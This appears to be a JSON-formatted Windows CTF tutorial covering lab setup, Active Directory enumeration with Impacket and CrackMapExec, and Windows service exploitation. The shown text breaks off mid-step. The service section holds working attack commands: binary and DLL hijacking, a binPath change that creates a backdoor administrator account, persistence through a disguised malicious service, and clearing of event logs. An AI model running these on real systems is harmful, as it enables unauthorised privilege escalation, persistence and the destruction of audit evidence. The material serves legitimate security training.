{
  "id": "windows_ctf",
  "title": "Windows CTF",
  "description": "Comprehensive Windows Capture The Flag methodology covering Active Directory reconnaissance, PowerShell exploitation, credential dumping, privilege escalation, and lateral movement techniques for beginner to intermediate CTF players",
  "type": "tutorial",
  "steps": [
    {
      "id": "windows-ctf-lab-setup",
      "title": "Windows CTF lab setup and attacker/target preparation",
      "content": "OBJECTIVE: Establish a comprehensive Windows penetration testing environment with Active Directory domain controller, Windows targets, and Linux attacker machine configured with essential Windows exploitation tools.\n\nACADEMIC BACKGROUND:\nWindows CTF challenges require understanding of Active Directory architecture, Kerberos authentication, NTLM protocols, and Windows privilege models. MITRE ATT&CK framework documents Windows-specific techniques across tactics. According to Verizon DBIR, Windows systems remain primary targets in enterprise environments. NIST SP 800-123 provides Windows security guidance. Proper lab setup ensures safe, isolated practice without affecting production systems.\n\nSTEP-BY-STEP PROCESS:\n\n1. Virtual Machine Architecture Planning:\n```bash\n# Recommended lab topology:\n# Network: 192.168.100.0/24 (isolated virtual network)\n# - 192.168.100.10: Windows Server 2019 (Domain Controller \"DC01\")\n# - 192.168.100.20: Windows 10 Pro (Domain-joined workstation \"WS01\")\n# - 192.168.100.30: Windows Server 2019 (Member server \"SRV01\")\n# - 192.168.100.50: Kali Linux (Attacker machine)\n\n# Minimum requirements per VM:\n# DC01: 2 GB RAM, 60 GB disk, 1 CPU\n# WS01: 2 GB RAM, 40 GB disk, 1 CPU  \n# SRV01: 2 GB RAM, 40 GB disk, 1 CPU\n# Kali: 4 GB RAM, 40 GB disk, 2 CPUs\n\n# VirtualBox/VMware network configuration:\n# Create Internal/Host-Only network: vboxnet0 / VMnet2\n# All VMs on same isolated network\n# No internet access for Windows VMs (prevent updates/telemetry)\n```\n\n2. Windows Server 2019 Domain Controller Setup:\n```powershell\n# On DC01 (Windows Server 2019):\n# Set static IP address:\nNew-NetIPAddress -InterfaceAlias \"Ethernet\" -IPAddress 192.168.100.10 `\n    -PrefixLength 24 -DefaultGateway 192.168.100.1\nSet-DnsClientServerAddress -InterfaceAlias \"Ethernet\" `\n    -ServerAddresses 127.0.0.1\n\n# Set hostname:\nRename-Computer -NewName \"DC01\" -Restart\n\n# Install Active Directory Domain Services:\nInstall-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools\n\n# Promote to Domain Controller:\nInstall-ADDSForest `\n    -DomainName \"ctf.local\" `\n    -DomainNetbiosName \"CTF\" `\n    -ForestMode \"WinThreshold\" `\n    -DomainMode \"WinThreshold\" `\n    -InstallDns:$true `\n    -SafeModeAdministratorPassword (ConvertTo-SecureString \"P@ssw0rd123!\" -AsPlainText -Force) `\n    -Force:$true\n\n# After reboot, create test users and groups:\nNew-ADUser -Name \"John Smith\" -SamAccountName \"jsmith\" `\n    -UserPrincipalName \"jsmith@ctf.local\" `\n    -AccountPassword (ConvertTo-SecureString \"Welcome2024!\" -AsPlainText -Force) `\n    -Enabled $true -PasswordNeverExpires $true\n\nNew-ADUser -Name \"Admin User\" -SamAccountName \"adm_backup\" `\n    -UserPrincipalName \"adm_backup@ctf.local\" `\n    -AccountPassword (ConvertTo-SecureString \"BackupAdmin2024!\" -AsPlainText -Force) `\n    -Enabled $true -PasswordNeverExpires $true\n\n# Add adm_backup to Backup Operators (interesting for privilege escalation):\nAdd-ADGroupMember -Identity \"Backup Operators\" -Members \"adm_backup\"\n\n# Create vulnerable service account (for Kerberoasting):\nNew-ADUser -Name \"SQL Service\" -SamAccountName \"svc_sql\" `\n    -ServicePrincipalName \"MSSQLSvc/srv01.ctf.local:1433\" `\n    -UserPrincipalName \"svc_sql@ctf.local\" `\n    -AccountPassword (ConvertTo-SecureString \"SQLService2020!\" -AsPlainText -Force) `\n    -Enabled $true -PasswordNeverExpires $true\n\n# Create computer accounts:\nNew-ADComputer -Name \"WS01\" -Path \"CN=Computers,DC=ctf,DC=local\"\nNew-ADComputer -Name \"SRV01\" -Path \"CN=Computers,DC=ctf,DC=local\"\n```\n\n3. Windows 10 Workstation Setup:\n```powershell\n# On WS01 (Windows 10 Pro):\n# Set static IP:\nNew-NetIPAddress -InterfaceAlias \"Ethernet\" -IPAddress 192.168.100.20 `\n    -PrefixLength 24 -DefaultGateway 192.168.100.1\nSet-DnsClientServerAddress -InterfaceAlias \"Ethernet\" `\n    -ServerAddresses 192.168.100.10\n\n# Set hostname:\nRename-Computer -NewName \"WS01\" -Restart\n\n# Join domain:\nAdd-Computer -DomainName \"ctf.local\" `\n    -Credential (Get-Credential) `\n    -Restart\n# Use CTF\\Administrator credentials\n\n# After joining, log in as domain user jsmith\n# Enable PSRemoting for exploitation practice:\nEnable-PSRemoting -Force\nSet-Item WSMan:\\localhost\\Client\\TrustedHosts -Value \"*\" -Force\n\n# Configure vulnerable settings (for CTF only!):\n# Disable Windows Defender:\nSet-MpPreference -DisableRealtimeMonitoring $true\nSet-MpPreference -DisableIOAVProtection $true\n\n# Disable Windows Firewall (for easier exploitation):\nSet-NetFirewallProfile -Profile Domain,Public,Private -Enabled False\n```\n\n4. Windows Server Member Server Setup:\n```powershell\n# On SRV01 (Windows Server 2019):\n# Similar to WS01, set IP 192.168.100.30, join domain\n# Install vulnerable services for CTF:\n\n# Install IIS with ASP.NET:\nInstall-WindowsFeature Web-Server,Web-Asp-Net45 -IncludeManagementTools\n\n# Create SMB shares with weak permissions:\nNew-Item -Path \"C:\\Shares\\Public\" -ItemType Directory\nNew-SmbShare -Name \"Public\" -Path \"C:\\Shares\\Public\" `\n    -FullAccess \"Everyone\"\n\n# Place flag file:\n\"flag{windows_smb_share_access}\" | Out-File \"C:\\Shares\\Public\\flag.txt\"\n\n# Enable WinRM:\nEnable-PSRemoting -Force\n```\n\n5. Kali Linux Attacker Setup:\n```bash\n# On Kali Linux (192.168.100.50):\n# Set static IP:\nsudo ip addr add 192.168.100.50/24 dev eth0\nsudo ip route add default via 192.168.100.1\n\n# Or using NetworkManager:\nsudo nmcli con mod \"Wired connection 1\" ipv4.addresses 192.168.100.50/24\nsudo nmcli con mod \"Wired connection 1\" ipv4.gateway 192.168.100.1\nsudo nmcli con mod \"Wired connection 1\" ipv4.dns 192.168.100.10\nsudo nmcli con mod \"Wired connection 1\" ipv4.method manual\nsudo nmcli con up \"Wired connection 1\"\n\n# Update and install Windows-specific tools:\nsudo apt update && sudo apt upgrade -y\n\n# Install Impacket (Python tools for Windows protocols):\nsudo apt install -y python3-impacket impacket-scripts\n\n# Verify Impacket tools:\nwhich psexec.py smbexec.py wmiexec.py secretsdump.py GetNPUsers.py GetUserSPNs.py\n\n# Install CrackMapExec (Swiss Army knife for Windows networks):\nsudo apt install -y crackmapexec\n\n# Install enum4linux-ng (improved SMB enumeration):\nsudo apt install -y enum4linux-ng\n\n# Install Responder (LLMNR/NBT-NS poisoning):\nsudo apt install -y responder\n\n# Install BloodHound (AD attack path analysis):\nsudo apt install -y bloodhound neo4j\n\n# Install Windows binaries for upload:\nsudo apt install -y powershell-empire starkiller\n\n# Install Rubeus (Kerberos exploitation) - Windows binary:\nwget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe -O ~/tools/Rubeus.exe\n\n# Install winPEAS (Windows privilege escalation):\nwget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -O ~/tools/winPEASx64.exe\n\n# Install Mimikatz:\nmkdir -p ~/tools/mimikatz\ncd ~/tools/mimikatz\nwget https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip\nunzip mimikatz_trunk.zip\n\n# Install SharpHound (BloodHound ingestor):\nwget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe -O ~/tools/SharpHound.exe\n```\n\n6. Network Connectivity Verification:\n```bash\n# From Kali, verify connectivity to all Windows hosts:\nping -c 3 192.168.100.10  # DC01\nping -c 3 192.168.100.20  # WS01\nping -c 3 192.168.100.30  # SRV01\n\n# DNS resolution test:\nnslookup dc01.ctf.local 192.168.100.10\nnslookup ctf.local 192.168.100.10\n\n# Add to /etc/hosts for convenience:\necho \"192.168.100.10 dc01.ctf.local dc01 ctf.local\" | sudo tee -a /etc/hosts\necho \"192.168.100.20 ws01.ctf.local ws01\" | sudo tee -a /etc/hosts\necho \"192.168.100.30 srv01.ctf.local srv01\" | sudo tee -a /etc/hosts\n\n# SMB connectivity test:\nsmbclient -L //192.168.100.10 -N  # Null session\ncrackmapexec smb 192.168.100.0/24  # Network scan\n```\n\n7. Active Directory Vulnerable Configuration (CTF Scenarios):\n```powershell\n# On DC01, create intentional vulnerabilities for practice:\n\n# Scenario 1: AS-REP Roasting (user without Kerberos pre-authentication):\nNew-ADUser -Name \"Service Account\" -SamAccountName \"svc_backup\" `\n    -UserPrincipalName \"svc_backup@ctf.local\" `\n    -AccountPassword (ConvertTo-SecureString \"Backup2020!\" -AsPlainText -Force) `\n    -Enabled $true -PasswordNeverExpires $true\nSet-ADAccountControl -Identity \"svc_backup\" -DoesNotRequirePreAuth $true\n\n# Scenario 2: Weak password for brute-force:\nNew-ADUser -Name \"Temp User\" -SamAccountName \"tempuser\" `\n    -UserPrincipalName \"tempuser@ctf.local\" `\n    -AccountPassword (ConvertTo-SecureString \"Password123\" -AsPlainText -Force) `\n    -Enabled $true\n\n# Scenario 3: User with DCSync rights (for testing):\nAdd-ADGroupMember -Identity \"Domain Admins\" -Members \"adm_backup\"\n# Then remove from Domain Admins but add DCSync rights:\n$user = Get-ADUser adm_backup\n$acl = Get-Acl \"AD:\\DC=ctf,DC=local\"\n$sid = $user.SID\n$identity = [System.Security.Principal.IdentityReference] $sid\n$adRights = [System.DirectoryServices.ActiveDirectoryRights] \"GenericAll\"\n$type = [System.Security.AccessControl.AccessControlType] \"Allow\"\n$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] \"All\"\n$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity,$adRights,$type,$inheritanceType)\n$acl.AddAccessRule($ace)\nSet-Acl -Path \"AD:\\DC=ctf,DC=local\" -AclObject $acl\n\n# Scenario 4: SMB share with passwords in files:\n\"admin:P@ssw0rd123!\" | Out-File \"C:\\Shares\\Public\\passwords.txt\"\n\"jsmith:Welcome2024!\" | Out-File -Append \"C:\\Shares\\Public\\passwords.txt\"\n```\n\n8. Workspace Organization on Kali:\n```bash\n# Create organized CTF workspace:\nmkdir -p ~/ctf/windows/{scans,enum,creds,loot,screenshots,tools,notes}\n\n# Create enumeration tracking file:\ncat > ~/ctf/windows/notes/checklist.md << 'EOF'\n# Windows CTF Enumeration Checklist\n\n## Network Enumeration\n- [ ] Port scanning (nmap)\n- [ ] SMB enumeration (enum4linux-ng, crackmapexec)\n- [ ] DNS enumeration\n- [ ] LDAP enumeration\n\n## User Enumeration\n- [ ] Username enumeration (kerbrute, enum4linux)\n- [ ] Valid credentials found\n- [ ] AS-REP roastable accounts identified\n- [ ] Kerberoastable accounts identified\n\n## Exploitation\n- [ ] Password spraying attempted\n- [ ] AS-REP roasting successful\n- [ ] Kerberoasting successful\n- [ ] Initial access gained\n\n## Post-Exploitation\n- [ ] Credential dumping (mimikatz, secretsdump.py)\n- [ ] BloodHound data collected\n- [ ] Privilege escalation path identified\n- [ ] Lateral movement performed\n\n## Flags Captured\n- [ ] Flag 1: \n- [ ] Flag 2:\n- [ ] Flag 3:\nEOF\n\n# Create automated enumeration script:\ncat > ~/ctf/windows/tools/auto_enum.sh << 'EOF'\n#!/bin/bash\nTARGET=$1\nDOMAIN=$2\n\nif [ -z \"$TARGET\" ] || [ -z \"$DOMAIN\" ]; then\n    echo \"Usage: $0 <target_ip> <domain>\"\n    exit 1\nfi\n\necho \"[+] Starting automated Windows enumeration\"\nOUTDIR=\"scans/$(date +%Y%m%d_%H%M%S)\"\nmkdir -p \"$OUTDIR\"\n\necho \"[*] Nmap scan...\"\nnmap -sV -sC -p- \"$TARGET\" -oA \"$OUTDIR/nmap_full\"\n\necho \"[*] SMB enumeration...\"\nenum4linux-ng \"$TARGET\" -A -C > \"$OUTDIR/enum4linux.txt\"\n\necho \"[*] CrackMapExec enumeration...\"\ncrackmapexec smb \"$TARGET\" --shares > \"$OUTDIR/cme_shares.txt\"\ncrackmapexec smb \"$TARGET\" --users > \"$OUTDIR/cme_users.txt\"\n\necho \"[*] Kerberos user enumeration...\"\nkerbrute userenum /usr/share/seclists/Usernames/Names/names.txt -d \"$DOMAIN\" --dc \"$TARGET\" > \"$OUTDIR/kerbrute.txt\"\n\necho \"[+] Enumeration complete. Results in $OUTDIR/\"\nEOF\nchmod +x ~/ctf/windows/tools/auto_enum.sh\n```\n\n9. Neo4j and BloodHound Configuration:\n```bash\n# Start Neo4j database for BloodHound:\nsudo neo4j console &\n# Default credentials: neo4j:neo4j (will prompt to change on first login)\n# Change to: neo4j:bloodhound (or your preference)\n\n# Wait for Neo4j to start (http://localhost:7474)\nsleep 10\n\n# Start BloodHound:\nbloodhound &\n\n# Configure BloodHound:\n# 1. Connect to database (bolt://localhost:7687)\n# 2. Credentials: neo4j:bloodhound\n# 3. Ready to import SharpHound data\n```\n\n10. Initial Environment Testing:\n```bash\n# Test 1: Verify SMB access to domain:\ncrackmapexec smb 192.168.100.10 -u '' -p ''  # Null session\ncrackmapexec smb 192.168.100.10 -u 'guest' -p ''  # Guest account\n\n# Test 2: Enumerate domain users:\nenum4linux-ng 192.168.100.10 -A\n\n# Test 3: Try known credentials:\ncrackmapexec smb 192.168.100.0/24 -u 'jsmith' -p 'Welcome2024!'\n\n# Test 4: Verify DNS:\ndig @192.168.100.10 ctf.local\n\n# Test 5: LDAP query:\nldapsearch -x -H ldap://192.168.100.10 -b \"DC=ctf,DC=local\"\n\n# Document findings:\ncat > ~/ctf/windows/notes/initial_test.txt << EOF\nEnvironment Test Results:\n- DC01 (192.168.100.10): Responding on ports 53, 88, 135, 139, 389, 445, 3389\n- WS01 (192.168.100.20): Responding on ports 135, 139, 445, 5985 (WinRM)\n- SRV01 (192.168.100.30): Responding on ports 80, 135, 139, 445\n- Domain: ctf.local\n- Users discovered: jsmith, adm_backup, svc_sql, svc_backup, tempuser\n- Null session: Enabled (intentional for CTF)\n- Guest account: Enabled\nEOF\n```\n\nWHAT TO LOOK FOR:\n- **Virtual network isolation**: Ensure no accidental connection to production networks\n- **Domain controller operational**: AD DS service running, DNS functioning\n- **Domain-joined machines**: Successfully authenticated to ctf.local domain\n- **Tool availability on Kali**: All Impacket, CrackMapExec, BloodHound tools installed\n- **Network connectivity**: Bi-directional communication between Kali and Windows hosts\n- **Vulnerable configurations**: Intentional misconfigurations present for exploitation practice\n- **Service availability**: SMB (445), WinRM (5985), RDP (3389), Kerberos (88) accessible\n\nSECURITY IMPLICATIONS:\n- **Isolated Environment Critical**: Lab must never connect to production Active Directory\n- **Weak Passwords Intentional**: Real environments require strong password policies (NIST 800-63B)\n- **Disabled Security Features**: Defender, Firewall disabled for learning; violates production security\n- **Open Shares**: \"Everyone\" permissions demonstrate CIS Control 14 violations\n- **AS-REP Roasting**: Pre-auth disabled users violate Microsoft security baselines\n- **Legal Practice Only**: Skills learned must only be applied to authorized testing environments\n\nCOMMON PITFALLS:\n- **Insufficient RAM**: Domain controller with <2 GB RAM performs poorly\n- **Network configuration errors**: Wrong network adapter settings prevent DC communication\n- **DNS misconfiguration**: Clients not pointing to DC for DNS causes domain join failures\n- **Firewall blocking**: Even with Windows Firewall off, hypervisor firewall may block traffic\n- **Licensing issues**: Windows Server requires evaluation license or paid license\n- **Snapshot before exploitation**: Forgetting to snapshot VMs before testing makes reset difficult\n- **Tool version mismatches**: Outdated Impacket or CME may have compatibility issues\n- **Time synchronization**: Kerberos requires synchronized clocks (within 5 minutes)\n\nTOOLS REFERENCE:\n- **VirtualBox**: https://www.virtualbox.org/ (Free hypervisor)\n- **VMware Workstation**: https://www.vmware.com/products/workstation-pro.html (Commercial hypervisor)\n- **Windows Server Evaluation**: https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019 (180-day trial)\n- **Windows 10 Enterprise Evaluation**: https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise (90-day trial)\n- **Impacket**: https://github.com/fortra/impacket (Python Windows protocol library)\n- **CrackMapExec**: https://github.com/Porchetta-Industries/CrackMapExec (Network assessment tool)\n- **BloodHound**: https://github.com/BloodHoundAD/BloodHound (AD attack path tool)\n- **Rubeus**: https://github.com/GhostPack/Rubeus (Kerberos abuse toolkit)\n- **winPEAS**: https://github.com/carlospolop/PEASS-ng (Windows privilege escalation enumeration)\n\nFURTHER READING:\n- Active Directory Security: https://adsecurity.org/\n- HackTricks Windows: https://book.hacktricks.xyz/windows-hardening/\n- Microsoft Security Baselines: https://learn.microsoft.com/en-us/windows/security/operating-system-security/device-management/windows-security-configuration-framework/windows-security-baselines\n- MITRE ATT&CK Windows: https://attack.mitre.org/matrices/enterprise/windows/\n- NIST SP 800-123 Windows Security: https://csrc.nist.gov/publications/detail/sp/800-123/final\n- PentestLab Windows Attacks: https://pentestlab.blog/category/red-team/",
      "tags": [
        "windows",
        "ctf",
        "lab-setup",
        "active-directory",
        "kali-linux"
      ],
      "related_tools": [
        "windows-exploit-suggester",
        "linux-smart-enumeration",
        "linux-exploit-suggester",
        "bloodhound-python",
        "comparison_directory_fuzzers"
      ]
    },
    {
      "id": "active-directory-enum",
      "title": "Active Directory enumeration and reconnaissance",
      "content": "OBJECTIVE: Systematically enumerate Active Directory domain structure, users, groups, computers, and permissions to identify attack paths and privilege escalation opportunities in Windows domain environments.\n\nACADEMIC BACKGROUND:\nActive Directory (AD) is Microsoft's directory service that stores information about network objects and enables administrators to manage permissions and access. AD enumeration is critical for understanding domain structure and identifying misconfigurations. MITRE ATT&CK T1087 (Account Discovery) and T1069 (Permission Groups Discovery) cover AD enumeration techniques. Understanding LDAP, Kerberos, and Group Policy is essential for effective Windows penetration testing.\n\nSTEP-BY-STEP PROCESS:\n\n1. Initial Domain Information Gathering:\n```bash\n# From Linux attacker (using Impacket tools):\n# Get domain information\npython3 GetADUsers.py -dc-ip 192.168.100.10 ctf.local/ -all\n\n# Enumerate domain users\npython3 GetADUsers.py -dc-ip 192.168.100.10 ctf.local/jsmith:Welcome2024! -all\n\n# Alternative: CrackMapExec\ncrackmapexec smb 192.168.100.10 -u jsmith -p Welcome2024! --users\ncrackmapexec smb 192.168.100.10 -u jsmith -p Welcome2024! --groups\ncrackmapexec smb 192.168.100.10 -u jsmith -p Welcome2024! --computers\n```\n\n2. LDAP Enumeration:\n```bash\n# Anonymous LDAP bind (if allowed):\nldapsearch -x -H ldap://192.168.100.10 -b \"DC=ctf,DC=local\"\n\n# Authenticated LDAP queries:\nldapsearch -x -H ldap://192.168.100.10 -D \"jsmith@ctf.local\" -w Welcome2024! -b \"DC=ctf,DC=local\" \"(objectClass=user)\" sAMAccountName\n\n# Enumerate domain admins:\nldapsearch -x -H ldap://192.168.100.10 -D \"jsmith@ctf.local\" -w Welcome2024! -b \"DC=ctf,DC=local\" \"(memberOf=CN=Domain Admins,CN=Users,DC=ctf,DC=local)\"\n\n# Find service accounts (SPN):\nldapsearch -x -H ldap://192.168.100.10 -D \"jsmith@ctf.local\" -w Welcome2024! -b \"DC=ctf,DC=local\" \"(servicePrincipalName=*)\" sAMAccountName servicePrincipalName\n```\n\n3. SMB Enumeration:\n```bash\n# Enumerate SMB shares:\nsmbclient -L //192.168.100.10 -U jsmith%Welcome2024!\n\n# Connect to shares:\nsmbclient //192.168.100.10/Public -U jsmith%Welcome2024!\n\n# List domain shares:\ncrackmapexec smb 192.168.100.10 -u jsmith -p Welcome2024! --shares\n\n# Check for null sessions:\nrpcclient -U \"\" 192.168.100.10 -c \"enumdomusers;quit\"\n```\n\n4. BloodHound Data Collection:\n```bash\n# From domain-joined Windows host (if compromised):\n# Run SharpHound\nSharpHound.exe -c All -d ctf.local\n\n# Alternative: From Linux with credentials\npython3 bloodhound.py -c All -u jsmith -p Welcome2024! -d ctf.local -dc dc01.ctf.local\n\n# Upload data to BloodHound:\n# Copy .zip file to attacker machine\n# Import into BloodHound GUI\n```\n\n5. Kerberos Enumeration:\n```bash\n# Enumerate users for AS-REP roasting:\npython3 GetNPUsers.py ctf.local/ -usersfile users.txt -format hashcat\n\n# Check for Kerberoastable accounts:\npython3 GetUserSPNs.py ctf.local/jsmith:Welcome2024! -outputfile kerberoast.txt\n\n# Enumerate domain controllers:\nnslookup -type=SRV _ldap._tcp.dc._msdcs.ctf.local\n```\n\n6. Group Policy Enumeration:\n```bash\n# From Windows host:\n# List GPOs\ngpresult /r\n\n# Get GPO details:\nGet-GPO -All | Format-Table DisplayName, Id\n\n# From Linux (if SYSVOL accessible):\nsmbclient //192.168.100.10/SYSVOL -U jsmith%Welcome2024! -c \"ls\"\n```\n\n7. Password Policy Analysis:\n```bash\n# Check domain password policy:\ncrackmapexec smb 192.168.100.10 -u jsmith -p Welcome2024! --pass-pol\n\n# From Windows:\nnet accounts\n\n# Check for weak passwords in found credentials\n```\n\n8. Trust Relationship Enumeration:\n```bash\n# Check for domain trusts:\npython3 get-domains-trust.py ctf.local/jsmith:Welcome2024!\n\n# Enumerate forest trusts:\ncrackmapexec ldap 192.168.100.10 -u jsmith -p Welcome2024! --trusted-domains\n```\n\n9. Organizational Unit (OU) Structure:\n```bash\n# Enumerate OUs:\nldapsearch -x -H ldap://192.168.100.10 -D \"jsmith@ctf.local\" -w Welcome2024! -b \"DC=ctf,DC=local\" \"(objectClass=organizationalUnit)\" ou\n\n# Check for GPO links:\nGet-GPO -All | ForEach-Object { $_.Links }\n```\n\n10. Attack Path Analysis:\n```bash\n# Use BloodHound to analyze attack paths:\n# 1. Import collected data\n# 2. Find paths from compromised user to Domain Admin\n# 3. Identify misconfigurations (GenericAll, WriteDACL, etc.)\n# 4. Prioritize high-impact attack paths\n\n# Common attack paths:\n# - User with DCSync rights\n# - GenericAll on Domain Admins group\n# - Password in description field\n# - Kerberoastable service accounts\n# - AS-REP roastable users\n```\n\nWHAT TO LOOK FOR:\n- **Domain Administrators**: Members of Domain Admins group\n- **Service Accounts**: Accounts with SPNs (Kerberoastable)\n- **Privileged Groups**: Enterprise Admins, Schema Admins, Backup Operators\n- **Misconfigured Permissions**: GenericAll, WriteDACL on critical objects\n- **Weak Passwords**: Accounts with password not required or expired\n- **Trust Relationships**: Inter-forest or external trusts\n- **GPO Misconfigurations**: Weak password policies, excessive permissions\n- **Shares with Sensitive Data**: SYSVOL, NETLOGON, user shares\n\nSECURITY IMPLICATIONS:\n- **Domain Compromise**: Enumeration enables targeted attacks on weak points\n- **Lateral Movement**: Understanding structure allows pivoting between systems\n- **Privilege Escalation**: Identifying misconfigurations leads to higher privileges\n- **Data Exposure**: Sensitive information in AD attributes (descriptions, etc.)\n- **Compliance Violations**: AD enumeration often reveals policy violations\n\nCOMMON PITFALLS:\n- **Insufficient Credentials**: Low-privilege accounts can't enumerate everything\n- **Firewall Blocking**: RPC/SMB ports blocked prevent enumeration\n- **Anonymous Bind Disabled**: Modern domains disable anonymous LDAP\n- **BloodHound Data Stale**: Old data doesn't reflect current configurations\n- **Over-reliance on Tools**: Manual verification required for accuracy\n- **Detection Evasion**: Aggressive enumeration may trigger alerts\n- **Time Synchronization**: Kerberos requires accurate time\n\nTOOLS REFERENCE:\n- **Impacket**: https://github.com/fortra/impacket (Python AD tools)\n- **CrackMapExec**: https://github.com/Porchetta-Industries/CrackMapExec (Swiss Army knife)\n- **BloodHound**: https://github.com/BloodHoundAD/BloodHound (AD visualization)\n- **ldapsearch**: OpenLDAP tool for LDAP queries\n- **rpcclient**: Samba tool for SMB enumeration\n- **enum4linux-ng**: https://github.com/cddmp/enum4linux-ng (SMB enumeration)\n\nFURTHER READING:\n- Active Directory Security: https://adsecurity.org/\n- MITRE ATT&CK Windows: https://attack.mitre.org/matrices/enterprise/windows/\n- HackTricks Active Directory: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology\n- SANS AD for Penetration Testers: https://www.sans.org/cyber-security-courses/active-directory-penetration-testing/\n- Microsoft AD Best Practices: https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory",
      "tags": [
        "windows",
        "active-directory",
        "enumeration",
        "reconnaissance",
        "ldap"
      ],
      "related_tools": [
        "recon-ng",
        "linux-smart-enumeration",
        "ligolo-ng",
        "bloodhound-python",
        "comparison_directory_fuzzers"
      ]
    },
    {
      "id": "windows-service-vuln-research",
      "title": "Windows service vulnerability research and exploitation",
      "content": "OBJECTIVE: Research and exploit Windows service misconfigurations, unquoted service paths, weak permissions, and vulnerable service binaries to achieve privilege escalation and system compromise.\n\nACADEMIC BACKGROUND:\nWindows services run with SYSTEM privileges when misconfigured, providing attackers with elevated access. Common vulnerabilities include unquoted service paths (MITRE T1574.009), weak service permissions (T1574.011), and vulnerable service binaries. NIST SP 800-123 covers Windows service security. Understanding Windows service architecture and privilege models is crucial for effective exploitation.\n\nSTEP-BY-STEP PROCESS:\n\n1. Service Enumeration:\n```bash\n# From Windows target (if compromised):\n# List all services\nsc query state= all\n\n# Get detailed service information\nsc qc \"ServiceName\"\n\n# Check service permissions\nsc sdshow \"ServiceName\"\n\n# From Linux attacker (with credentials):\ncrackmapexec smb 192.168.100.20 -u jsmith -p Welcome2024! --services\n\n# Using Impacket services\npython3 services.py ctf.local/jsmith:Welcome2024!@192.168.100.20 query\n```\n\n2. Unquoted Service Path Exploitation:\n```bash\n# Identify unquoted service paths:\nwmic service get name,pathname,startmode | findstr /i auto | findstr /i /v \"c:\\\\windows\\\\\"\n\n# Check for writable directories in path:\n# If service path is: C:\\Program Files\\My Service\\service.exe\n# Check if C:\\Program.exe exists (would execute first)\n\n# Exploit unquoted path:\n# Create malicious executable in writable directory\ncopy /Y C:\\tools\\nc.exe \"C:\\Program.exe\"\n\n# Restart service to trigger exploit\nsc stop \"VulnerableService\"\nsc start \"VulnerableService\"\n```\n\n3. Service Binary Hijacking:\n```bash\n# Check service binary permissions:\nicacls \"C:\\path\\to\\service.exe\"\n\n# If service binary is writable:\n# Replace with malicious binary\ncopy /Y C:\\tools\\malicious.exe \"C:\\path\\to\\service.exe\"\n\n# Restart service\nsc stop \"ServiceName\"\nsc start \"ServiceName\"\n```\n\n4. Service Configuration Modification:\n```bash\n# Check service configuration permissions:\nsc sdshow \"ServiceName\"\n\n# If you can modify service config:\n# Change service to run as SYSTEM\nsc config \"ServiceName\" obj= \"LocalSystem\" password= \"\"\n\n# Change binary path to malicious executable\nsc config \"ServiceName\" binPath= \"C:\\tools\\malicious.exe\"\n\n# Start modified service\nsc start \"ServiceName\"\n```\n\n5. DLL Hijacking in Services:\n```bash\n# Check for missing DLLs in service directory:\n# Use Process Monitor to capture DLL loads\n\n# Create malicious DLL with required exports:\n# For example, if service loads vulnerable.dll\n\n# Exploit DLL search order:\n# Place malicious DLL in service working directory\ncopy /Y C:\\tools\\malicious.dll \"C:\\service\\dir\\vulnerable.dll\"\n```\n\n6. Windows Service Privilege Escalation Techniques:\n```bash\n# Method 1: Insecure Service Permissions\n# Check if user can start/stop service\nsc sdshow \"ServiceName\"\n\n# If allowed, modify service to run malicious binary\nsc config \"ServiceName\" binPath= \"net user hacker Password123 /add && net localgroup administrators hacker /add\"\nsc stop \"ServiceName\"\nsc start \"ServiceName\"\n\n# Method 2: Weak Registry Permissions\n# Check service registry key permissions\nreg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\ServiceName\"\n\n# If writable, modify ImagePath\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\ServiceName\" /v ImagePath /t REG_EXPAND_SZ /d \"C:\\tools\\malicious.exe\" /f\n```\n\n7. Automated Service Vulnerability Scanning:\n```bash\n# Use winPEAS for automated service checks:\nwinPEASx64.exe servicesinfo\n\n# Check for:\n# - Modifiable services\n# - Unquoted service paths\n# - Writable service binaries\n# - Services with weak permissions\n\n# PowerShell service enumeration:\nGet-WmiObject win32_service | Select-Object Name, DisplayName, PathName, StartMode, StartName | Where-Object {$_.StartMode -eq \"Auto\"}\n```\n\n8. Service Account Exploitation:\n```bash\n# Check service accounts:\nsc query | findstr SERVICE_START_NAME\n\n# If service runs as domain user:\n# Attempt to compromise service account\n# Check for Kerberoastable service accounts\npython3 GetUserSPNs.py ctf.local/jsmith:Welcome2024!\n\n# If service account has excessive privileges:\n# Use service for lateral movement\n```\n\n9. Windows Service Persistence:\n```bash\n# Create malicious service:\nsc create \"MaliciousService\" binPath= \"C:\\tools\\malicious.exe\" start= auto\nsc description \"MaliciousService\" \"System monitoring service\"\n\n# Start the service:\nsc start \"MaliciousService\"\n\n# Hide the service:\n# Modify registry to hide from sc query\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\MaliciousService\" /v \"Hidden\" /t REG_DWORD /d 1 /f\n```\n\n10. Cleanup and Evasion:\n```bash\n# Restore original service configuration:\nsc config \"ServiceName\" binPath= \"original_path\"\nsc config \"ServiceName\" obj= \"original_account\"\n\n# Remove malicious files:\ndel \"C:\\tools\\malicious.exe\"\n\n# Clear event logs:\nwevtutil cl System\nwevtutil cl Security\nwevtutil cl Application\n```\n\nWHAT TO LOOK FOR:\n- **Unquoted Service Paths**: Spaces in paths without quotes\n- **Weak Service Permissions**: Users can modify service config\n- **Writable Service Binaries**: Service executables modifiable by low-privilege users\n- **Missing DLLs**: Services loading non-existent DLLs\n- **Service Accounts**: Domain accounts with SPNs or excessive privileges\n- **Auto-Start Services**: Services that start automatically with SYSTEM privileges\n- **Registry Permissions**: Weak permissions on service registry keys\n\nSECURITY IMPLICATIONS:\n- **SYSTEM Privilege Escalation**: Service misconfigurations lead to full system compromise\n- **Persistence Mechanisms**: Malicious services survive reboots\n- **Lateral Movement**: 